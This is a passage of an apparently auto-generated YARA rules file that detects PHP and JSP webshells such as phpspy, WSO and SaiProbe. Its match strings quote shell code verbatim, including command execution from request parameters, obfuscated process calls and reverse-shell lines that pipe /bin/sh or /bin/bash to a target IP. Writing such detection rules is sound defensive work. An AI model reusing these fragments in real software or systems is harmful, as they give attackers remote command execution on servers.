      $s11 = " echo\"Help?? View <A href=\\\"http://www.ph4nt0m.org/bbs/showthread.php?threadid=33006\\\" target=\\\"_blank\\\">http://www.ph4" ascii
      $s12 = " echo\"Help?? View <A href=\\\"http://www.ph4nt0m.org/bbs/showthread.php?threadid=33006\\\" target=\\\"_blank\\\">http://www.ph4" ascii
      $s13 = "$result=shell_exec($_POST['command']);" fullword ascii
      $s14 = "$url= \"http://data.alexa.com/data?cli=10&dat=snba&url=\".$_SERVER['HTTP_HOST'];" fullword ascii
      $s15 = "$cmd = \"cmd.exe\";" fullword ascii
      $s16 = "$sql_query = \"CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\\\\Winnt\\\\\\Mix.dll';" fullword ascii
      $s17 = ":</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].$cckk.'_MySQL.sql','','text','50').'</td></tr><tr nowrap><" ascii
      $s18 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"\".$ck.\"_Files.zip\");" fullword ascii
      $s19 = "mix.dll" fullword ascii
      $s20 = "header('Content-Description: PHP Generated Data');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule phpspy_2006 {
   meta:
      description = "webshell - file phpspy_2006.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $s2 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $s3 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $s4 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $s6 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s7 = "$result=shell_exec($_POST['command']);" fullword ascii
      $s8 = ":</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td col" ascii
      $s9 = "header('Content-Description: PHP Generated Data');" fullword ascii
      $s10 = "if ($_POST['do'] == 'login') {" fullword ascii
      $s11 = "$result = exec($_POST['command']);" fullword ascii
      $s12 = "37 => array(\"FTP\",getfun(\"ftp_login\"))," fullword ascii
      $s13 = " angel [<a href=\\\"http://www.bugkidz.org\\\" target=\\\"_blank\\\">BST</a>] " fullword ascii
      $s14 = " <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">www.4ngel.net</a> " fullword ascii
      $s15 = " <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">Security Angel</a> " fullword ascii
      $s16 = "$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'she" ascii
      $s17 = "ll_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_ex" ascii
      $s18 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"_Files.tar.gz\");" fullword ascii
      $s19 = "$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die(\"PHP Create COM WSHSHELL failed\");" fullword ascii
      $s20 = "$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_lnc {
   meta:
      description = "webshell - file lnc.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x2 = "if(@ereg(\"default\\.|index\\.|admin\\.|bbs\\.|conn\\.|config\\.|reg\\.|help\\.|upfile\\.|upload\\.|cart\\.|class\\.|login\\.|di" ascii
      $s3 = "$process = proc_open(\"\".$_POST['cmd'].\"\", $descriptorspec, $pipes);" fullword ascii
      $s4 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $s5 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $s6 = ": '.$tb->makeinput('durl','http://blog.blackwoods.com/miyabi/myshell.txt','','text','70').'<br>" fullword ascii
      $s7 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s8 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $s9 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s10 = "$result=shell_exec($_POST['command']);" fullword ascii
      $s11 = "$cmd = \"cmd.exe\";" fullword ascii
      $s12 = "$sql_query = \"CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\\\\Winnt\\\\\\Mix.dll';" fullword ascii
      $s13 = ":</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td col" ascii
      $s14 = "header('Content-Description: PHP Generated Data');" fullword ascii
      $s15 = "if ($_POST['do'] == 'login') {" fullword ascii
      $s16 = "$result = exec($_POST['command']);" fullword ascii
      $s17 = "37 => array(\"FTP\",getfun(\"ftp_login\"))," fullword ascii
      $s18 = "shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell','proc_open'=>'proc_open') : array('system'=>'system','passthru'=>'passth" ascii
      $s19 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"_Files.tar.gz\");" fullword ascii
      $s20 = "\" src=\"http://www.google.com\"></iframe>');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule wso_4_2_0 {
   meta:
      description = "webshell - file wso-4.2.0.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b4c76bead50773295dc09fc006ec5143c7aa3558db7c96cccddb8ab180f8d63b"
   strings:
      $s1 = "         '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@" ascii
      $s2 = "                $str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $s3 = " Unable to execute command\\n\";" fullword ascii
      $s4 = "    $explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s5 = "                showSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s6 = "        if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $s7 = "    echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SE" ascii
      $s8 = "    if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOS" ascii
      $s9 = "    if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_" ascii
      $s10 = "        $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);" fullword ascii
      $s11 = "    if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOS" ascii
      $s12 = "ame=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect " ascii
      $s13 = "['HTTP_HOST'] . \" - WSO \" . VERSION .\"</title>" fullword ascii
      $s14 = "    if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_" ascii
      $s15 = "    if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_" ascii
      $s16 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"])) {" fullword ascii
      $s17 = "hp_uname()).'\" target=\"_blank\">[ Google ]</a> <a href=\"'.$explink.'\" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( " ascii
      $s18 = "        d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s19 = "        d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s20 = "        $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule webshell_php_code {
   meta:
      description = "webshell - file code.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "95884ff3ada861e259442eb0c8920ff8bdb25064c237b292036fa1f65fdfac00"
   strings:
      $s1 = " input{font:11px Verdana;BACKGROUND:#FFFFFF;height:18px;border:1px solid #666666;}a{color:#00f;text-decoration:underline;}a:hove" ascii
      $s2 = "  <!-- return -->" fullword ascii
      $s3 = "  <!-- file -->" fullword ascii
      $s4 = "<form action=\"\" id=\"form1\" name=\"form1\" encType=\"multipart/form-data\"  method=\"post\" target=\"hidden_frame\">" fullword ascii
      $s5 = " <!-- return -->" fullword ascii
      $s6 = "login();" fullword ascii
      $s7 = "$(\"login\").style.display = \"block\";" fullword ascii
      $s8 = "login()" fullword ascii
      $s9 = "r:#0449BE;color:white;margin:0 2px;padding:2px 3px;width:10px;}.high2{margin:0 2px;padding:2px 0px;width:10px;}#login{display:no" ascii
      $s10 = "      if(!empty($_POST['pwd']) && strlen(password) == 32) $password = hash(crypt, $_POST['pwd']); " fullword ascii
      $s11 = "$(\"login\").style.display = \"block\"" fullword ascii
      $s12 = "     Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:<span id=\"memory\">{memory}</span>" fullword ascii
      $s13 = "$action=!empty($action) ? strtolower(rtrim($action,'/')) : 'login';" fullword ascii
      $s14 = "  static function login() {" fullword ascii
      $s15 = "        header('Content-Description: File Transfer'); " fullword ascii
      $s16 = "$(\"login_open\").onclick = function() {" fullword ascii
      $s17 = "  <!-- end -->" fullword ascii
      $s18 = "      if((true == $password) && $password !==password) die('{\"error\":\"" fullword ascii
      $s19 = "    setcookie('key', '', time() - 3600*24*30);" fullword ascii
      $s20 = "window.location.href = '?action=download&file=' + arg;" fullword ascii
   condition:
      uint16(0) == 0x2f2f and filesize < 100KB and
      8 of them
}

rule SaiProbe_v1_0 {
   meta:
      description = "webshell - file SaiProbe_v1.0.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e7db686c4ad84a44e1deec1f86e7ff63378a1f53c3ad4fd55a5824c71d936c82"
   strings:
      $s1 = "            system(\"php -r '$sock=fsockopen($targetip,$targetport);exec('/bin/sh -i <&3 >&3 2>&3');'\");" fullword ascii
      $s2 = "            system('mknod inittab p && telnet {$targetip} {$targetport} 0<inittab | /bin/bash 1>inittab');" fullword ascii
      $s3 = "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" /><meta http-equiv=\"Content-Type\" content=\"text/html; charset=" ascii
      $s4 = "================================================================================================================================" ascii
      $s5 = "=================================--><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtm" ascii
      $s6 = "--------------------------------><div align=\"center\" style=\"display:none\" id=\"command\">" fullword ascii
      $s7 = "IP\"><input type=\"text\" name=\"targetport\" placeholder=\"" fullword ascii
      $s8 = "</div><div align=\"center\"><a href=\"http://www.heysec.org\">Code by Sai</a></div><script type=\"text/javascript\">" fullword ascii
      $s9 = "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" /><meta http-equiv=\"Content-Type\" content=\"text/html; charset=" ascii
      $s10 = " @gethostbyname($_SERVER['SERVER_NAME']);} ?>)</td>" fullword ascii
      $s11 = "--------------------------------><div align=\"center\" id=\"portscan\" style=\"display:none\">" fullword ascii
      $s12 = "    function tansmit($sourceip,$sourceport,$targetip,$targetport){" fullword ascii
      $s13 = "        tranmit($_POST['sourceip'],$_POST['sourceport'],$_POST['targetip'],$_POST['targetport']);" fullword ascii
      $s14 = "    function bounce($targetip,$targetport){" fullword ascii
      $s15 = "DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head>   <title>Sai " fullword ascii
      $s16 = "')</script>\";" fullword ascii
      $s17 = "</div><!-----------------------------phpinfo--------------------------------><div align=\"center\" id=\"phpinfo\" style=\"displa" ascii
      $s18 = "</div><!-----------------------------phpinfo--------------------------------><div align=\"center\" id=\"phpinfo\" style=\"displa" ascii
      $s19 = "            <td><?php echo $_SERVER['SERVER_NAME'];?>(<?php if('/'==DIRECTORY_SEPARATOR){echo $_SERVER['SERVER_ADDR'];}else{echo" ascii
      $s20 = "                        <input type=\"text\" name=\"targetip\" placeholder=\"" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule ProcessBuilder_cmd {
   meta:
      description = "webshell - file ProcessBuilder-cmd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e66b66c9508d4ef242db4ffd7a7200f922588e47acbd0c5b6584668efbd61c25"
   strings:
      $s1 = "        Scanner sc = new Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");" fullword ascii
      $s2 = "            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99" ascii
      $s3 = "        Process process = pb.start();" fullword ascii
      $s4 = "            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99" ascii
      $s5 = "            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);" fullword ascii
      $s6 = "        ProcessBuilder pb;" fullword ascii
      $s7 = "<FORM METHOD=\"POST\" NAME=\"form\" ACTION=\"#\">" fullword ascii
      $s8 = "<%@ page import=\"java.util.Scanner\" %>" fullword ascii
      $s9 = "    String query = request.getParameter(\"q\");" fullword ascii
      $s10 = "}), query);" fullword ascii
      $s11 = "<%@ page pageEncoding=\"utf-8\"%>" fullword ascii
      $s12 = "<H3>Build By LandGrey</H3>" fullword ascii
      $s13 = "<title>Just For Fun</title>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 3KB and
      8 of them
}

rule ProcessBuilder_reflect_cmd {
   meta:
      description = "webshell - file ProcessBuilder-reflect-cmd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c5140e63f74c516f2632919dd636e96f0b99b69002e4d75338195ffec4aea02"
   strings:
      $s1 = "        Process s = (Process) PB.getMethod(new String(decoder.decodeBuffer(\"c3RhcnQ=\"))).invoke(PB.getDeclaredConstructors()[0" ascii
      $s2 = "        Process s = (Process) PB.getMethod(new String(decoder.decodeBuffer(\"c3RhcnQ=\"))).invoke(PB.getDeclaredConstructors()[0" ascii
      $s3 = "<FORM METHOD=POST ACTION='#'>" fullword ascii
      $s4 = "<%@ page import=\"sun.misc.BASE64Decoder\" %>" fullword ascii
      $s5 = "<%@ page import=\"java.util.Scanner\" %>" fullword ascii
      $s6 = "    public static String getPicture(String str) throws Exception {" fullword ascii
      $s7 = "<%@ page import=\"sun.misc.BASE64Encoder\" %>" fullword ascii
      $s8 = "<%@ page import=\"java.util.List\" %>" fullword ascii
      $s9 = "<%@ page import=\"java.util.ArrayList\" %>" fullword ascii
      $s10 = "        Scanner sc = new Scanner(s.getInputStream()).useDelimiter(\"\\\\A\");" fullword ascii
      $s11 = "    String query = request.getParameter(\"q\");" fullword ascii
      $s12 = "<H3>Build By LandGrey</H3>" fullword ascii
      $s13 = "<title>Just For Fun</title>" fullword ascii
      $s14 = "            list.add(new String(decoder.decodeBuffer(\"L2Jpbi9iYXNo\")));" fullword ascii
      $s15 = "            list.add(new String(decoder.decodeBuffer(\"L2M=\")));" fullword ascii
      $s16 = "        list.add(new String(decoder.decodeBuffer(str)));" fullword ascii
      $s17 = "            list.add(new String(decoder.decodeBuffer(\"Y21k\")));" fullword ascii
      $s18 = "        return encoder.encode(result.getBytes(\"UTF-8\"));" fullword ascii
      $s19 = "newInstance(list));" fullword ascii
      $s20 = "        name = getPicture(query);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 5KB and
      8 of them
}

rule jsp_custom_script_for_oracle {
   meta:
      description = "webshell - file jsp_custom_script_for_oracle.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "995616ab61521a4d0e2414ad7fb56931f16b3a0fc13930b60ae9a1e709911d62"
   strings:
      $s1 = "        Process p = Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "            sb.append(ExecuteCommandCode(pars[1], pars[2]));" fullword ascii
      $s3 = "    String ExecuteCommandCode(String cmdPath, String command) throws Exception {" fullword ascii
      $s4 = "                CopyFileOrDirCode(sourceFilePath + \"/\" + z[j].getName(), targetFilePath + \"/\" + z[j].getName());" fullword ascii
      $s5 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,javax.crypto.*,java.security.*,javax.crypto.spec.*\" co" ascii
      $s6 = "  password" fullword ascii
      $s7 = "        ResultSet rs = stmt.executeQuery(sql);" fullword ascii
      $s8 = "    Cookie cookie = new Cookie(SessionKey, session.getId());" fullword ascii
      $s9 = "sessionkey id" fullword ascii
      $s10 = "        Connection c = DriverManager.getConnection(url,x[2],x[3]);" fullword ascii
      $s11 = "    String CopyFileOrDirCode(String sourceFilePath, String targetFilePath) throws Exception {" fullword ascii
      $s12 = " shell " fullword ascii
      $s13 = "weblogic war " fullword ascii
      $s14 = "        String user = (String)System.getProperty(\"user.name\");" fullword ascii
      $s15 = "        SecretKeySpec keys = new SecretKeySpec(key.getBytes(\"UTF-8\"), \"AES\");" fullword ascii
      $s16 = "                if (c.getName().equals(SessionKey)) {" fullword ascii
      $s17 = "        AesKey = getKeyFromCookie(request.getCookies());" fullword ascii
      $s18 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,javax.crypto.*,java.security.*,javax.crypto.spec.*\" co" ascii
      $s19 = "    *   - aes_keylen: 16" fullword ascii
      $s20 = "    *   - aes_keylen: 32" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 60KB and
      8 of them
}

rule Runtime_reflect_cmd {
   meta:
      description = "webshell - file Runtime-reflect-cmd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3eecc354390d60878afaa67a20b0802ce5805f3a9bb34e74dd8c363e3ca0ea5c"
   strings:
      $s1 = "        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new S" ascii
      $s2 = "        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new S" ascii
      $s3 = "<FORM METHOD=POST ACTION='#'>" fullword ascii
      $s4 = "<%@ page import=\"java.util.Scanner\" pageEncoding=\"UTF-8\" %>" fullword ascii
      $s5 = "    public static String getPicture(String str) throws Exception{" fullword ascii
      $s6 = "        Scanner sc = new Scanner(e.getInputStream()).useDelimiter(\"\\\\A\");" fullword ascii
      $s7 = "    String query = request.getParameter(\"q\");" fullword ascii
      $s8 = "<H3>Build By LandGrey</H3>" fullword ascii
      $s9 = "<title>Just For Fun</title>" fullword ascii
      $s10 = "        name = getPicture(query);" fullword ascii
      $s11 = "<%= name %>" fullword ascii
      $s12 = "tring(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null, new Object[]{}),  new Object[] { str });" fullword ascii
      $s13 = "            str = new String(new byte[] {99, 109, 100, 46, 101, 120, 101, 32, 47, 67, 32}) + str;" fullword ascii
      $s14 = "            str =  new String(new byte[] {47, 98, 105, 110, 47, 98, 97, 115, 104, 32, 45, 99, 32}) + str;" fullword ascii
      $s15 = "9, 101 }));" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 4KB and
      8 of them
}

rule dev_core {
   meta:
      description = "webshell - file dev_core.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ce82bff4cbfe2832136ea50bf57029896e1a3f22f51dfc808fb017210e6b9ebc"
   strings:
      $s1 = "687474703a2f2f323031326865696b652e676f6f676c65636f64652e636f6d2f73766e2f7472756e6b2f6d696e692e686b" ascii /* hex encoded string 'http://2012heike.googlecode.com/svn/trunk/mini.hk' */
      $s2 = "687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f636f64652e6a7067" ascii /* hex encoded string 'http://7shell.googlecode.com/svn/code.jpg' */
      $s3 = "$(\"login\").style.display = \"block\"" fullword ascii
      $s4 = "    $login = <<< HTML" fullword ascii
      $s5 = "            setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword ascii
      $s6 = "request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');" fullword ascii
      $s7 = "        echo str_replace('{self}', $_SERVER[\"SCRIPT_NAME\"], $login);" fullword ascii
      $s8 = "<meta http-equiv=\"content-type\" content=\"text/html\" />" fullword ascii
      $s9 = "options.method = 'POST';" fullword ascii
      $s10 = "    $in .= \"User-Agent: E/1.0 EBSD\\r\\n\";" fullword ascii
      $s11 = "<meta name=\"author\" content=\"Steve Smith\" />" fullword ascii
      $s12 = "       Password: " fullword ascii
      $s13 = "req.open(options.method, options.url, true);" fullword ascii
      $s14 = "req.onreadystatechange = function() {" fullword ascii
      $s15 = "   <div id=\"login\">" fullword ascii
      $s16 = "if (req.readyState == 4 && req.status == 200) {" fullword ascii
      $s17 = "document.onkeydown = function(e) {" fullword ascii
      $s18 = "options.url = '{self}';" fullword ascii
      $s19 = "    if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword ascii
      $s20 = "    #login{display:none;}" fullword ascii
   condition:
      uint16(0) == 0x2f2f and filesize < 20KB and
      8 of them
}

rule iMHaPFtp {
   meta:
      description = "webshell - file iMHaPFtp.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e6129cd3d309aa57e8ccbd2455743d17a288b52ef2e56ea0e949cdb408b9ca51"
   strings:
      $s1 = " * http://www.imhabirligi.com" fullword ascii
      $s2 = " * <powerghost@imhabirligi.com>" fullword ascii
      $s3 = " *  ozgurkaleli@yahoo.com" fullword ascii
      $s4 = " * iMHaPFTP.php - iMHaBiRLiGi Php Ftp Editoru" fullword ascii
      $s5 = "'not_executed' => \"\\\"[%1]\\\" Basarili bir sekilde Uygulanamadi:\\n{%2}\"," fullword ascii
      $s6 = "'executed' => \"\\\"[%1]\\\" Basarili bir sekilde Uygulandi:\\n{%2}\"," fullword ascii
      $s7 = " * Copyright (C) 2003-2005  iMHaBiRLiGi <iMHaBiRLiGi@imhabirligi.com>" fullword ascii
      $s8 = "exec('echo \"./' . basename($file) . '\" | /bin/sh', $output, $retval);" fullword ascii
      $s9 = " * For example: './' - the script's directory" fullword ascii
      $s10 = " * <BeweiS@imhabirligi.com>" fullword ascii
      $s11 = " * <MicroP_@imhabirligi.com>" fullword ascii
      $s12 = "if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {" fullword ascii
      $s13 = " * Programin amaci ftp olmadan hostunuza baglanti kurup " fullword ascii
      $s14 = "<br><Center>SU AN <A href=\"http://www.imhabirligi.com\">iMHaBiRLiGi</A> HUDUTLARINDA BULUNMAKTASINIZ.!!</Center>" fullword ascii
      $s15 = "listing_page(error('not_executed', $file, implode(\"\\n\", $output)));" fullword ascii
      $s16 = "if (array_key_exists('content', $_POST)) {" fullword ascii
      $s17 = "echo \"\\n\" . $_POST['user'] . ':' . crypt($_POST['password']);" fullword ascii
      $s18 = "src=\"http://www.nettekiadres.com/imhabirligi.jpg\" width=282></BODY>" fullword ascii
      $s19 = "if ($file['is_link']) $file['target'] = @readlink($path);" fullword ascii
      $s20 = "$scriptdir = getcwd();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule pHp {
   meta:
      description = "webshell - file pHp.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e7ce4dcd824c0a9f2455d2f6f3de70251c08084510c674e6fe089d3b2bb85aac"
   strings:
      $s1 = "header(\"content-Type: text/html; charset=gb2312\");" fullword ascii
      $s2 = ": <input type=\"text\" name=\"dir\" value=\"'.($_POST['dir'] ? strdir($_POST['dir'].'/') : strdir($_SERVER['DOCUMENT_ROOT'].'/')" ascii
      $s3 = "    '/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*\\)/i'," fullword ascii
      $s4 = ": <input type=\"text\" name=\"dir\" value=\"'.($_POST['dir'] ? strdir($_POST['dir'].'/') : strdir($_SERVER['DOCUMENT_ROOT'].'/')" ascii
      $s5 = ": <input type=\"text\" name=\"exs\" value=\"'.($_POST['exs'] ? $_POST['exs'] : '.php|.inc|.phtml').'\" style=\"width:398px;\"><d" ascii
      $s6 = "if(file_exists($_POST['dir']) && $_POST['exs']) {" fullword ascii
      $s7 = "    '/(fopen|fwrite|fputs|file\\_put\\_contents)+\\s*\\((.*)\\$\\_(GET|POST|REQUEST|COOKIE|SERVER)+\\[(.*)\\](.*)\\)/i'," fullword ascii
      $s8 = "ini_set('max_execution_time',20000);" fullword ascii
      $s9 = ": <input type=\"text\" name=\"exs\" value=\"'.($_POST['exs'] ? $_POST['exs'] : '.php|.inc|.phtml').'\" style=\"width:398px;\"><d" ascii
      $s10 = "error_reporting(E_ERROR);" fullword ascii
      $s11 = "    '/function\\_exists\\s*\\(\\s*[\\'|\\\"](popen|exec|proc\\_open|system|passthru)+[\\'|\\\"]\\s*\\)/i'," fullword ascii
      $s12 = "echo '<form method=\"POST\">';" fullword ascii
      $s13 = "    '/\\$(\\w+)\\s*\\(\\s*\\$\\_(GET|POST|REQUEST|COOKIE|SERVER)+\\[(.*)\\]\\s*\\)/i'," fullword ascii
      $s14 = "    '/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|array\\_walk)+\\s*\\(\\s*\\$\\_(GET|POST|REQUEST|CO" ascii
      $s15 = "    '/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|array\\_walk)+\\s*\\(\\s*\\$\\_(GET|POST|REQUEST|CO" ascii
      $s16 = "ER|SESSION)+\\[(.*)\\]\\s*\\)/i'," fullword ascii
      $s17 = "    '/echo\\s*curl\\_exec\\s*\\(\\s*\\$(\\w+)\\s*\\)/i'," fullword ascii
      $s18 = "    '/new com\\s*\\(\\s*[\\'|\\\"]shell(.*)[\\'|\\\"]\\s*\\)/i'," fullword ascii
      $s19 = "    '/\\$\\_(GET|POST|REQUEST|COOKIE|SERVER)+\\[(.*)\\]\\(\\s*\\$(.*)\\)/i'," fullword ascii
      $s20 = "    '/(eval|assert|include|require|include\\_once|require\\_once)+\\s*\\(\\s*(base64\\_decode|str\\_rot13|gz(\\w+)|file\\_(\\w+)" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule cihshell_fix {
   meta:
      description = "webshell - file cihshell_fix.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ad2eea05e8fe56b1fa769f8df49e42c78be5534237429aea9ea78b9b31e4c7ab"
   strings:
      $s1 = "iv >';$sqlq =  $_POST['sql'];$db = mysql_connect($dbhost.':'.$dbport,$dblogin,$dbpass);if($db)" fullword ascii
      $s2 = "$db = mysql_connect($_POST['mysql_host'].':'.$_POST['mysql_port'],$_POST['mysql_login'],$_POST['mysql_passw']);" fullword ascii
      $s3 = "else {echo ' <html><head><style>body{background:#333;}</style><title>login </title></head><body><table style=\"margin-left:100px" ascii
      $s4 = "function cmd_exec($cmd2)" fullword ascii
      $s5 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhost = 'localhost';}if (isset($_POST['mysqlw_db']))" ascii
